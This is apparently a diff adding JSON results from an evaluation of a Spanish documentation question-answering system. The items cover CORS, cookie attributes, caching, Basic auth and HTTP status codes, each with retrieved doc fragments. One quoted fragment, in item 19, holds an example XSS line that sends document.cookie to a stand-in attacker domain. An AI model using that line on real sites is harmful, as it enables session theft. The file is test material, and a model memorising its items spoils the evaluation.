+          "texto": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes verificadas previamente\nA diferencia de las solicitudes simples, para las \"solicitudes verificadas previamente\" el navegador envía primero una petición HTTP utilizando el método OPTIONS al recurso en el otro origen, para determinar si la solicitud real es segura de enviar. Este tipo de solicitudes entre orígenes se verifican previamente porque pueden afectar a los datos del usuario.  \nA continuación se muestra un ejemplo de solicitud que se comprobará previamente:  \n```js\nconst xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"https://bar.other/doc\");\nxhr.setRequestHeader(\"X-PINGOTHER\", \"pingpong\");\nxhr.setRequestHeader(\"Content-Type\", \"text/xml\");\nxhr.onreadystatechange = handler;\nxhr.send(\"Arun\");\n```",
+          "fuente": "17-http-cors.md",
+          "seccion": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes verificadas previamente",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9665
+        },
+        {
+          "texto": "Intercambio de recursos de origen cruzado (CORS) > Las cabeceras de respuesta HTTP > Access-Control-Allow-Methods\nLa cabecera Access-Control-Allow-Methods especifica el método o métodos permitidos al acceder al recurso. Se utiliza en respuesta a una solicitud de verificación previa. las condiciones bajo las que una solicitud es verificada previamente se han explicado anteriormente.  \n```http\nAccess-Control-Allow-Methods: [, ]*\n```  \nMás arriba se ofrece un ejemplo de solicitud de verificación previa, incluido un ejemplo que envía esta cabecera al navegador.",
+          "fuente": "17-http-cors.md",
+          "seccion": "Intercambio de recursos de origen cruzado (CORS) > Las cabeceras de respuesta HTTP > Access-Control-Allow-Methods",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9591
+        },
+        {
+          "texto": "Intercambio de recursos de origen cruzado (CORS) > Las cabeceras de solicitud HTTP > Access-Control-Request-Method\nLa cabecera de solicitud Access-Control-Request-Method se utiliza cuando se emite una solicitud de verificación previa para que el servidor sepa qué método HTTP se utilizará cuando se realice la solicitud real.  \n```http\nAccess-Control-Request-Method:\n```  \nPuede encontrar ejemplos de este uso arriba",
+          "fuente": "17-http-cors.md",
+          "seccion": "Intercambio de recursos de origen cruzado (CORS) > Las cabeceras de solicitud HTTP > Access-Control-Request-Method",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9325
+        }
+      ]
+    },
+    {
+      "id": 19,
+      "tipo": "factual",
+      "pregunta": "¿Para qué sirve el atributo HttpOnly de una cookie?",
+      "con_respuesta": true,
+      "referencia": "Hace que la cookie no sea accesible desde JavaScript (document.cookie) y solo se envíe al servidor, lo que ayuda a prevenir ataques XSS.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 9.96,
+      "respuesta": "El atributo `HttpOnly` en una cookie ayuda a mitigar ataques como el secuestro de sesión y XSS (Cross-Site Scripting) al evitar que el valor de la cookie sea accesible desde JavaScript. Esto significa que las cookies con este atributo solo se envían al servidor y no están disponibles para scripts de cliente, lo cual reduce el riesgo de que un ataque XSS robe la información de la cookie [1][2].",
+      "respuesta_cruda": "El atributo `HttpOnly` en una cookie ayuda a mitigar ataques como el secuestro de sesión y XSS (Cross-Site Scripting) al evitar que el valor de la cookie sea accesible desde JavaScript. Esto significa que las cookies con este atributo solo se envían al servidor y no están disponibles para scripts de cliente, lo cual reduce el riesgo de que un ataque XSS robe la información de la cookie [1][2].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "HTTP cookies > Seguridad > Secuestro de session y XSS\nLas cookies son utilizadas a menudo en aplicaciones web para identificar a un usuario y su sesión autenticada, así que el robo de una cookie puede implicar el secuestro de la sesión del usuario autenticado. Las formas más comunes de robar cookies incluyen ingeniería social o la explotación de una vulnerabilidad XSS de la aplicación.  \n```js\nnew Image().src =\n\"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```  \nEl atributo cookie `HttpOnly` puede ayudar a mitigar este ataque evitando el acceso al valor de la cookie a través de JavaScript.",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies > Seguridad > Secuestro de session y XSS",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9935
+        },
+        {
+          "texto": "HTTP cookies > Creando cookies > Cookies `Secure` y `HttpOnly`\nUna cookie segura sólo se envía al servidor con una petición cifrada sobre el protocolo HTTPS. Incluso con `Secure`, no debería almacenarse _nunca_ información sensible en la cookies, ya que son inherentemente inseguras y este flag no puede ofrecer protección real. A partir de Chrome 52 y Firefox 52, los sitios inseguros (`http:`) no pueden establecer cookies con la directiva `Secure`.  \nPara prevenir ataques cross-site scripting (XSS), las cookies `HttpOnly` son inaccesibles desde la API de Javascript Document.cookie; Solamente se envían al servidor. Por ejemplo, las cookies que persisten sesiones del lado del servidor no necesitan estar disponibles para JavaScript, por lo que debería establecerse el flag `HttpOnly`.  \n```",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies > Creando cookies > Cookies `Secure` y `HttpOnly`",
+          "confidencialidad": "publico",
+          "puntuacion": 0.935
+        },
+        {
+          "texto": "HTTP cookies\nUna cookie HTTP, cookie web o cookie de navegador es una pequeña pieza de datos que un servidor envía a el navegador web del usuario. El navegador guarda estos datos y los envía de regreso junto con la nueva petición al mismo servidor. Las cookies se usan generalmente para decirle al servidor que dos peticiones tienen su origen en el mismo navegador web lo que permite, por ejemplo, mantener la sesión de un usuario abierta. Las cookies permiten recordar la información de estado en vista a que el protocolo HTTP es un protocolo sin estado.  \nLas cookies se utilizan principalmente con tres propósitos:  \n- Gestión de Sesiones\n- : Inicios de sesión, carritos de compras, puntajes de juegos o cualquier otra cosa que el servidor deba recordar\n- Personalización",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies",
+          "confidencialidad": "publico",
+          "puntuacion": 0.7453
+        },
+        {
+          "texto": "HTTP cookies > Creando cookies > Acceso desde JavaScript usando `Document.cookie`\nTambién se pueden crear nuevas cookies via JavaScript usando la propiedad Document.cookie, y si el flag `HttpOnly` no está establecido, también se puede acceder a las cookies existentes desde JavaScript.  \n```js\ndocument.cookie = \"yummy_cookie=choco\";\ndocument.cookie = \"tasty_cookie=strawberry\";\nconsole.log(document.cookie);\n// logs \"yummy_cookie=choco; tasty_cookie=strawberry\"\n```  \nTenga en cuenta las cuestiones de seguridad en la siguiente sección Seguridad. Las cookies disponibles para JavaScript pueden ser robadas por medio de XSS.",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies > Creando cookies > Acceso desde JavaScript usando `Document.cookie`",
+          "confidencialidad": "publico",
+          "puntuacion": 0.5436
+        },
+        {
+          "texto": "HTTP cookies > Creando cookies > Cookies `Secure` y `HttpOnly`\n```\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly\n```",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies > Creando cookies > Cookies `Secure` y `HttpOnly`",
+          "confidencialidad": "publico",
+          "puntuacion": 0.4521
+        }
+      ]
+    },
+    {
+      "id": 20,
+      "tipo": "factual",
+      "pregunta": "¿Qué protege el atributo SameSite de las cookies?",
+      "con_respuesta": true,
+      "referencia": "Permite pedir que la cookie no se envíe en solicitudes cross-site, lo que da cierta protección contra ataques CSRF.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 9.52,
+      "respuesta": "El atributo `SameSite` de las cookies proporciona protección contra ataques cross-site request forgery (CSRF). Este atributo permite que los servidores requieran que una cookie no sea enviada con solicitudes cross-site, donde Site es definido por el dominio registrable [1].",
+      "respuesta_cruda": "El atributo `SameSite` de las cookies proporciona protección contra ataques cross-site request forgery (CSRF). Este atributo permite que los servidores requieran que una cookie no sea enviada con solicitudes cross-site, donde Site es definido por el dominio registrable [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "HTTP cookies > Creando cookies > Cookies `SameSite`\nLas cookies `SameSite` permiten a los servidores requerir que una cookie no sea enviada con solicitudes cross-site (donde Site es definido por el dominio registrabe), lo que proporciona algo de protección contra ataques cross-site request forgery (CSRF).  \nLas cookies `SameSite` son relativamente nuevas y soportadas por los principales navegadores.  \nAquí hay un ejemplo:  \n```\nSet-Cookie: key=value; SameSite=Strict\n```  \nEl atributo same-site puede tomar uno de los dos valores (case-insensitive):  \n- `Strict`",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies > Creando cookies > Cookies `SameSite`",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9981
+        },
+        {
+          "texto": "HTTP cookies > Creando cookies > Cookies `SameSite`\n```  \nEl atributo same-site puede tomar uno de los dos valores (case-insensitive):  \n- `Strict`\n- : Si una cookie same-site tiene este atributo, el navegador sólo enviará cookies si la solicitud se originó en el sitio web que estableció la cookie. Si la solicitud se originó desde una URL diferente que la URL del location actual, no se incluirá ninguna cookie etiquetada con el atributo `Strict`.\n- `Lax`\n- : Si el atributo se establece en Lax, las cookies same-site se retienen en (sub)peticiones cross-site, tales como llamadas para cargar imágenes o frames, pero se enviarán cuando un usuario navegue a la URL desde un sitio externo, por ejemplo, siguiendo un enlace.",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies > Creando cookies > Cookies `SameSite`",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9897
+        },
+        {
+          "texto": "HTTP cookies > Rastreo y privacidad > Cookies de terceros\n- Los servidores pueden (y deberían) configurar el atributo SameSite para especificar si se pueden enviar o no cookies de terceros.\n- Las cookies que tienen un estado de partición independiente (CHIPS) les permiten a los desarrolladores habilitar sus cookies en el almacenamiento particionado, con un contenedor de cookies separado por sitio de nivel superior. Esto permite que los usos válidos sin seguimiento de cookies de terceros sigan funcionando en navegadores que no permiten el uso de cookies para el seguimiento de terceros.",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies > Rastreo y privacidad > Cookies de terceros",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9655
+        },
+        {
+          "texto": "HTTP cookies > Creando cookies > Cookies `SameSite`\nEl comportamiento por defecto de este flag si no está establecido, o no está soportado por el navegador, es incluir las cookies en cualquier solicitud, incluyendo solicitudes corss-origin.",
+          "fuente": "18-http-cookies.md",
+          "seccion": "HTTP cookies > Creando cookies > Cookies `SameSite`",
+          "confidencialidad": "publico",
+          "puntuacion": 0.4895
+        },
+        {
+          "texto": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes con credenciales\n#### Cookies de terceros  \nTenga en cuenta que las Cookies establecidas en las respuestas CORS están sujetas a la políticas normales sobre Cookies de terceros. En el ejemplo anterior, la página se carga desde `foo.example` pero la Cookie de la línea 19 es enviada por `bar.other`, por lo que no se guardaría si el navegador del usuario está configurado para rechazar todas las Cookies de terceros.  \nLa Cookie en la solicitud anterior (línea 10) también puede ser suprimida en las políticas normales sobre Cookies de terceros. Por lo tanto, la política de Cookies aplicada puede anular la capacidad descrita en este capítulo, impidiéndole realizar solicitudes con credenciales.  \nSe aplicaría la política de Cookies en torno al atributo Cookies del mismo sitio",
+          "fuente": "17-http-cors.md",
+          "seccion": "Intercambio de recursos de origen cruzado (CORS) > Ejemplos de escenarios de control de acceso > Solicitudes con credenciales",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0195
+        }
+      ]
+    },
+    {
+      "id": 21,
+      "tipo": "factual",
+      "pregunta": "¿Qué directiva de Cache-Control obliga a validar siempre con el servidor antes de reutilizar una respuesta?",
+      "con_respuesta": true,
+      "referencia": "no-cache.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 10.14,
+      "respuesta": "La directiva `no-cache` obliga al cliente a enviar una solicitud de validación antes de reutilizar cualquier respuesta almacenada. Esto se menciona en [1] y [2].",
+      "respuesta_cruda": "La directiva `no-cache` obliga al cliente a enviar una solicitud de validación antes de reutilizar cualquier respuesta almacenada. Esto se menciona en [1] y [2].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "HTTP caching > No caché > Proporcionar contenido actualizado\nLa directiva `no-store` evita que se almacene una respuesta, pero no elimina ninguna respuesta ya almacenada para la misma URL.  \nEn otras palabras, si ya hay una respuesta anterior almacenada para una URL en particular, devolver `no-store` no evitará que se reutilice la respuesta anterior.  \nSin embargo, una directiva `no-cache` forzará al cliente a enviar una solicitud de validación antes de reutilizar cualquier respuesta almacenada.  \n```http\nCache-Control: no-cache\n```  \nSi el servidor no admite solicitudes condicionales, se puede obligar al cliente a acceder al servidor cada vez y obtener siempre la última respuesta con `200 OK`.",
+          "fuente": "19-http-cache.md",
+          "seccion": "HTTP caching > No caché > Proporcionar contenido actualizado",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9983
+        },
+        {
+          "texto": "HTTP caching > Validación > Forzar la revalidación\nSi no desea que se reutilice una respuesta, sino que desea obtener siempre el contenido más reciente del servidor, puede utilizar la directiva `no-cache` para forzar la validación.  \nAl agregar `Cache-Control: no-cache` a la respuesta junto con `Last-Modified` y `ETag`, como se muestra a continuación, el cliente recibirá una respuesta `200 OK` si el recurso solicitado se actualizó o de lo contrario, recibirá una respuesta `304 Not Modified` si el recurso solicitado no se ha actualizado.  \n```http\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 1024\nDate: Tue, 22 Feb 2022 22:22:22 GMT\nLast-Modified: Tue, 22 Feb 2022 22:00:00 GMT\nETag: deadbeef\nCache-Control: no-cache",
+          "fuente": "19-http-cache.md",
+          "seccion": "HTTP caching > Validación > Forzar la revalidación",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9976
+        },
+        {
+          "texto": "HTTP caching > No caché\nLa directiva `no-cache` no evita el almacenamiento de respuestas, sino que evita la reutilización de respuestas sin revalidación.  \nSi no desea que una respuesta se almacene en ningún caché, use `no-store`.  \n```http\nCache-Control: no-store\n```  \nSin embargo, en general, un requisito de \"no almacenar en caché\" equivale en la práctica al siguiente conjunto de circunstancias:  \n- No se desea que nadie que no sea el cliente específico almacene la respuesta, por razones de privacidad.\n- Se quiere proporcionar información actualizada siempre.\n- No se sabe qué podría pasar en implementaciones obsoletas.  \nBajo ese conjunto de circunstancias, `no-store` no siempre es la directiva más apropiada.  \nLas siguientes secciones analizan las circunstancias con más detalle.",
+          "fuente": "19-http-cache.md",
+          "seccion": "HTTP caching > No caché",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9814
+        },
+        {
+          "texto": "HTTP caching > Validación > Forzar la revalidación\n...\n```  \nA menudo se afirma que la combinación de `max-age=0` y `must-revalidate` tiene el mismo significado que `no-cache`.  \n```\nCache-Control: max-age=0, must-revalidate\n```  \n`max-age=0` significa que la respuesta es _stale_ de inmediato, y `must-revalidate` significa que no debe reutilizarse sin revalidación una vez que esté _stale_ ; por lo tanto, en combinación, la semántica parece ser la misma que `no-cache`.  \nSin embargo, ese uso de `max-age=0` es un remanente del hecho de que muchas implementaciones anteriores a HTTP/1.1 no pudieron manejar la directiva `no-cache` y, por lo tanto, para lidiar con esa limitación, `max-age =0` se utilizó como solución alternativa.",
+          "fuente": "19-http-cache.md",
+          "seccion": "HTTP caching > Validación > Forzar la revalidación",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9778
+        },
+        {
+          "texto": "HTTP caching > Recargar y forzar recarga > Evitar la revalidación\nAl contenido que nunca cambia se le debe dar un `max-age` largo mediante el uso de la prevención de caché, es decir, al incluir un número de versión, un valor hash, etc., en la URL de solicitud.  \nSin embargo, cuando el usuario recarga, se envía una solicitud de revalidación a pesar de que el servidor sabe que el contenido es inmutable.  \nPara evitar eso, la directiva `immutable` se puede usar para indicar explícitamente que no se requiere revalidación porque el contenido nunca cambia.  \n```http\nCache-Control: max-age=31536000, immutable\n```  \nEso evita la revalidación innecesaria durante las recargas.  \nTenga en cuenta que, en lugar de implementar esa directiva, Chrome ha cambiado su implementación para que la revalidación no sea realizada durante las recargas de subrecursos.",
+          "fuente": "19-http-cache.md",
+          "seccion": "HTTP caching > Recargar y forzar recarga > Evitar la revalidación",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9084
+        }
+      ]
+    },
+    {
+      "id": 22,
+      "tipo": "factual",
+      "pregunta": "¿La autenticación HTTP Basic cifra las credenciales?",
+      "con_respuesta": true,
+      "referencia": "No: las transmite codificadas en base64, que no es cifrado. Debe usarse siempre sobre HTTPS.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 8.6,
+      "respuesta": "No, la autenticación HTTP Basic no cifra las credenciales; estas son transmitidas codificadas en base64. La codificación en base64 no proporciona seguridad ya que es reversible [4].",
+      "respuesta_cruda": "No, la autenticación HTTP Basic no cifra las credenciales; estas son transmitidas codificadas en base64. La codificación en base64 no proporciona seguridad ya que es reversible [4].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Autenticación HTTP > Esquema de autenticación Basic\nEl esquema de autenticación HTTP \"Basic\" está definido en , que transmite las credenciales como un par usuario/contraseña codificado usando base64.",
+          "fuente": "20-http-autenticacion.md",
+          "seccion": "Autenticación HTTP > Esquema de autenticación Basic",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9959
+        },
+        {
+          "texto": "Autenticación HTTP > El marco general de autenticación HTTP > Esquemas de autenticación\nEl marco general de autenticación HTTP es usado por varios esquemas de autenticación. Los esquemas pueden diferenciarse por la dureza en la seguridad y en su disponibilidad en software de clientes o servidores.  \nEl esquema de autenticación mas común es \"Basic\", que es introducido con mas detalle abajo. IANA mantiene una lista de esquemas de autenticación, pero existen otros esquemas ofrecidos por proveedores de servicios, como Amazon AWS. Los esquemas de autenticación incluídas:  \n- **Basic** (ver , credenciales codificadas en base64 . Ver mas abajo para mas información.),\n- **Bearer** (ver , bearer tokens de acceso en recursos protegidos mediante OAuth 2.0),\n- **Digest** (ver , hash MD5 solo soportado en Firefox, ver Error 472823 en Firefox para hash SHA-256),",
+          "fuente": "20-http-autenticacion.md",
+          "seccion": "Autenticación HTTP > El marco general de autenticación HTTP > Esquemas de autenticación",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9537
+        },
+        {
+          "texto": "Autenticación HTTP > Esquema de autenticación Basic > Restringiendo acceso con nginx y autenticación básica\nEn el caso de nginx necesitarás especificar la localización a proteger y usar la directiva **auth_basic**, que provee el nombre del área protegida. La directiva **auth_basic_user_file** apunta al fichero .htpasswd que contiene las credenciales de usuario encriptadas, como en el ejemplo de Apache de mas arriba.  \n```\nlocation /status {\nauth_basic           \"Access to the staging site\";\nauth_basic_user_file /etc/apache2/.htpasswd;\n}\n```",
+          "fuente": "20-http-autenticacion.md",
+          "seccion": "Autenticación HTTP > Esquema de autenticación Basic > Restringiendo acceso con nginx y autenticación básica",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9362
+        },
+        {
+          "texto": "Autenticación HTTP > Esquema de autenticación Basic > Seguridad de la autenticación básica\nComo el usuario y la contraseña son pasados a través de la red como texto plano (éste es codificado en base64, pero base64 puede ser decodificado), el esquema de autenticación básico no es seguro. HTTPS / TLS debe ser usado junto a la autenticación básica. Sin éstas mejoras de seguridad, la autenticación básica no debe ser usada para proteger información sensible o valiosa.",
+          "fuente": "20-http-autenticacion.md",
+          "seccion": "Autenticación HTTP > Esquema de autenticación Basic > Seguridad de la autenticación básica",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9118
+        },
+        {
+          "texto": "Autenticación HTTP > El marco general de autenticación HTTP > `Cabeceras Authorization` y `Proxy-Authorization`\nLa cabecera de consulta Authorization y Proxy-Authorization contiene las credenciales para autenticar a un user agent con un servidor (proxy). Aquí, el tipo es necesario necesario siguiendo las credenciales que pueden estar codificadas o encriptadas dependiendo de que tipo de esquema de autenticación se esté usando:  \n```\nAuthorization:\nProxy-Authorization:\n```",
+          "fuente": "20-http-autenticacion.md",
+          "seccion": "Autenticación HTTP > El marco general de autenticación HTTP > `Cabeceras Authorization` y `Proxy-Authorization`",
+          "confidencialidad": "publico",
+          "puntuacion": 0.7866
+        }
+      ]
+    },
+    {
+      "id": 23,
+      "tipo": "factual",
+      "pregunta": "¿Qué diferencia hay entre los códigos 401 y 403 en autenticación?",
+      "con_respuesta": true,
+      "referencia": "401 indica que faltan credenciales válidas; 403 que las credenciales son válidas pero no dan acceso a ese recurso.",
+      "recall5": true,
+      "no_lo_tengo": false,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 9.9,
+      "respuesta": "El código de estado 401 `Unauthorized` indica que el servidor necesita credenciales para responder a la solicitud, mientras que el código 403 `Forbidden` se utiliza cuando el servidor recibe unas credenciales válidas pero no son adecuadas para acceder al recurso solicitado. La autenticación es posible con un 401, pero no con un 403 ya que las credenciales proporcionadas son inválidas en ese contexto [1].",
+      "respuesta_cruda": "El código de estado 401 `Unauthorized` indica que el servidor necesita credenciales para responder a la solicitud, mientras que el código 403 `Forbidden` se utiliza cuando el servidor recibe unas credenciales válidas pero no son adecuadas para acceder al recurso solicitado. La autenticación es posible con un 401, pero no con un 403 ya que las credenciales proporcionadas son inválidas en ese contexto [1].",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "Autenticación HTTP > El marco general de autenticación HTTP > Prohibición de Acceso (Access Forbbiden)\nSi el servidor proxy recibe unas credenciales válidas que no son adecuadas para acceder a un determinado recurso, el servidor respondera con el código de estado 403 `Forbidden`. Diferente al código de estado 401 `Unauthorized` o 407 `Proxy Authentication Required`, donde la autenticación es imposible para ese usuario.",
+          "fuente": "20-http-autenticacion.md",
+          "seccion": "Autenticación HTTP > El marco general de autenticación HTTP > Prohibición de Acceso (Access Forbbiden)",
+          "confidencialidad": "publico",
+          "puntuacion": 0.9855
+        },
+        {
+          "texto": "Autenticación HTTP > El marco general de autenticación HTTP\n7235 define el marco de autenticación HTTP que puede ser usado por un servidor para revisar la solicitud de un cliente y por un cliente para proveer información de autenticación. El flujo de la revisión y la respuesta funciona de la siguiente manera: El servidor responde al cliente con un estado de respuesta 401 (Unauthorized) y devuelve al cliente información sobre cómo autorizarse con un encabezado de respuesta WWW-Authenticate que contiene al menos una revisión. Un cliente que quiera autenticarse con un servidor puede hacerlo incluyendo un encabezado de solicitud Authorization con sus credenciales. Normalmente un cliente hará una solicitud de contraseña al usuario y luego enviará la solicitud incluyendo el encabezado `Authorization` correcto al servidor.",
+          "fuente": "20-http-autenticacion.md",
+          "seccion": "Autenticación HTTP > El marco general de autenticación HTTP",
+          "confidencialidad": "publico",
+          "puntuacion": 0.2277
+        },
+        {
+          "texto": "Autenticación HTTP > Ver también\n- WWW-Authenticate\n- Authorization\n- Proxy-Authorization\n- Proxy-Authenticate\n- 401, 403, 407",
+          "fuente": "20-http-autenticacion.md",
+          "seccion": "Autenticación HTTP > Ver también",
+          "confidencialidad": "publico",
+          "puntuacion": 0.1661
+        },
+        {
+          "texto": "Autenticación HTTP > El marco general de autenticación HTTP > Autenticación Proxy (Proxy Authentication)\nEl mismo mecanismo de desafío y respuesta puede ser usada para _autenticación por proxy._ En este caso, es el proxy el que hace de intermediario y requiere la autenticación. Ambas autenticaciones (autenticación del recurso y autenticación en el proxy) pueden coexistir juntas, pero entonces es necesario un conjunto de cabeceras y códigos de estado diferentes. En el caso de los proxys, el código de estado para requerir autenticación es 407 (Proxy Authentication Required), la cabecera de respuesta Proxy-Authenticate contiene al menos un requerimiento aplicable en el proxy, y la cabecera de petición Proxy-Authorization es usada para proveer la credencial en el servidor proxy.",
+          "fuente": "20-http-autenticacion.md",
+          "seccion": "Autenticación HTTP > El marco general de autenticación HTTP > Autenticación Proxy (Proxy Authentication)",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0385
+        },
+        {
+          "texto": "Autenticación HTTP > El marco general de autenticación HTTP > Esquemas de autenticación\nEl marco general de autenticación HTTP es usado por varios esquemas de autenticación. Los esquemas pueden diferenciarse por la dureza en la seguridad y en su disponibilidad en software de clientes o servidores.  \nEl esquema de autenticación mas común es \"Basic\", que es introducido con mas detalle abajo. IANA mantiene una lista de esquemas de autenticación, pero existen otros esquemas ofrecidos por proveedores de servicios, como Amazon AWS. Los esquemas de autenticación incluídas:  \n- **Basic** (ver , credenciales codificadas en base64 . Ver mas abajo para mas información.),\n- **Bearer** (ver , bearer tokens de acceso en recursos protegidos mediante OAuth 2.0),\n- **Digest** (ver , hash MD5 solo soportado en Firefox, ver Error 472823 en Firefox para hash SHA-256),",
+          "fuente": "20-http-autenticacion.md",
+          "seccion": "Autenticación HTTP > El marco general de autenticación HTTP > Esquemas de autenticación",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0111
+        }
+      ]
+    },
+    {
+      "id": 24,
+      "tipo": "sin_respuesta",
+      "pregunta": "¿Cuál es la última versión estable de Kubernetes?",
+      "con_respuesta": false,
+      "referencia": null,
+      "recall5": null,
+      "no_lo_tengo": true,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 10.72,
+      "respuesta": "No lo tengo en la documentación.",
+      "respuesta_cruda": "No lo tengo en la documentación.",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
+          "texto": "¿Qué es Kubernetes?\nEsta página ofrece una visión general sobre Kubernetes.  \nKubernetes es una plataforma portable y extensible de código abierto para\nadministrar cargas de trabajo y servicios. Kubernetes facilita la automatización\ny la configuración declarativa. Tiene un ecosistema grande y en rápido crecimiento.\nEl soporte, las herramientas y los servicios para Kubernetes están ampliamente disponibles.  \nGoogle liberó el proyecto Kubernetes en el año 2014. Kubernetes se basa en la experiencia de\nGoogle corriendo aplicaciones en producción a gran escala por década y media, junto a las mejores ideas y prácticas de la comunidad.",
+          "fuente": "01-k8s-que-es-kubernetes.md",
+          "seccion": "¿Qué es Kubernetes?",
+          "confidencialidad": "publico",
+          "puntuacion": 0.4581
+        },
+        {
+          "texto": "Deployment > Estado del Deployment > Completar un Deployment\nKubernetes marca un Deployment como _completado_ cuando presenta las siguientes características:  \n* Todas las réplicas asociadas con el Deployment han sido actualizadas a la última versión indicada, lo cual quiere decir\nque todas las actualizaciones se han completado.\n* Todas las réplicas asociadas con el Deployment están disponibles.\n* No están ejecutándose viejas réplicas del Deployment.  \nPuedes comprobar si un Deployment se ha completado usando el comando `kubectl rollout status`. Si el despliegue se ha completado\nde forma satisfactoria, el comando `kubectl rollout status` devuelve un código 0 de salida.  \n```shell\nkubectl rollout status deployment.v1.apps/nginx-deployment\n```\n```\nWaiting for rollout to finish: 2 of 3 updated replicas are available...",
+          "fuente": "04-k8s-deployments.md",
+          "seccion": "Deployment > Estado del Deployment > Completar un Deployment",
+          "confidencialidad": "publico",
+          "puntuacion": 0.179
+        },
+        {
+          "texto": "¿Qué es Kubernetes? > Lo que Kubernetes no es\nKubernetes no es una Plataforma como Servicio (PaaS) convencional. Ya que\nKubernetes opera a nivel del contenedor y no a nivel del hardware, ofrece\nalgunas características que las PaaS también ofrecen, como deployments,\nescalado, balanceo de carga, registros y monitoreo. Dicho esto, Kubernetes\nno es monolítico y las soluciones que se ofrecen de forma predeterminada\nson opcionales e intercambiables.  \nKubernetes ofrece los elementos esenciales para construir una plataforma\npara desarrolladores, preservando la elección del usuario y la flexibilidad\nen las partes más importantes.  \nEntonces, podemos decir que Kubernetes:",
+          "fuente": "01-k8s-que-es-kubernetes.md",
+          "seccion": "¿Qué es Kubernetes? > Lo que Kubernetes no es",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0818
+        },
+        {
+          "texto": "¿Qué es Kubernetes? > ¿Por qué necesito Kubernetes y qué puede hacer por mi?\nKubernetes tiene varias características. Puedes pensar en Kubernetes como:  \n- una plataforma de contenedores\n- una plataforma de microservicios\n- una plataforma portable de nube  \ny mucho más.  \nKubernetes ofrece un entorno de administración **centrado en contenedores**. Kubernetes\norquesta la infraestructura de cómputo, redes y almacenamiento para que las cargas de\ntrabajo de los usuarios no tengan que hacerlo. Esto ofrece la simplicidad de las Plataformas\ncomo Servicio (PaaS) con la flexibilidad de la Infraestructura como Servicio (IaaS) y permite\nla portabilidad entre proveedores de infraestructura.",
+          "fuente": "01-k8s-que-es-kubernetes.md",
+          "seccion": "¿Qué es Kubernetes? > ¿Por qué necesito Kubernetes y qué puede hacer por mi?",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0496
+        },
+        {
+          "texto": "¿Qué es Kubernetes? > Lo que Kubernetes no es\nen las partes más importantes.  \nEntonces, podemos decir que Kubernetes:  \n* No limita el tipo de aplicaciones que soporta. Kubernetes busca dar soporte a un número diverso de cargas de trabajo, que incluyen aplicaciones con y sin estado así como aplicaciones que procesan datos. Si la aplicación puede correr en un contenedor, debería correr bien en Kubernetes.\n* No hace deployment de código fuente ni compila tu aplicación. Los flujos de integración, entrega y deployment continuo (CI/CD) vienen determinados por la cultura y preferencia organizacional y sus requerimientos técnicos.",
+          "fuente": "01-k8s-que-es-kubernetes.md",
+          "seccion": "¿Qué es Kubernetes? > Lo que Kubernetes no es",
+          "confidencialidad": "publico",
+          "puntuacion": 0.0289
+        }
+      ]
+    },
+    {
+      "id": 25,
+      "tipo": "sin_respuesta",
+      "pregunta": "¿Cómo se configura un pipeline en Jenkins?",
+      "con_respuesta": false,
+      "referencia": null,
+      "recall5": null,
+      "no_lo_tengo": true,
+      "ruta": null,
+      "intentos": 0,
+      "error": null,
+      "segundos": 8.65,
+      "respuesta": "No lo tengo en la documentación.",
+      "respuesta_cruda": "No lo tengo en la documentación.",
+      "salida_bloqueada": false,
+      "fragmentos": [
+        {
